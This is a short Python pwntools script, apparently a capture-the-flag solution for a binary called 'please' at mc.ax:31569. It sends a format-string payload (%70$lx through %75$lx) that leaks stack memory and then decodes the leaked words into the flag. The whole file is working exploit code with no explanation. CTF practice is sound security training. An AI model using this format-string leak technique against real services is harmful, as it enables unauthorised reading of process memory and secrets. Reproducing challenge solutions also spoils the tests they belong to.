#!/usr/bin/env python3
import pwn
import sys

host = "mc.ax"
port = 31569
target = "./please"


def exploit(remote=False):
    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target)

    try:
        pr.readline()
        payload = b'please' + b'%70$lx-%71$lx-%72$lx-%73$lx-%74$lx-%75$lx'
        pr.sendline(payload)
        line = pr.readuntil(' ').decode().strip()[6:]
        line = line.split('-')
        flag = ''.join([''.join(reversed(bytes.fromhex(l).decode())) for l in line if len(l) > 1])
        print(flag)
    except Exception as ex:
        print(ex)
    finally:
        pr.close()

remote = False
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    remote = True
exploit(remote)
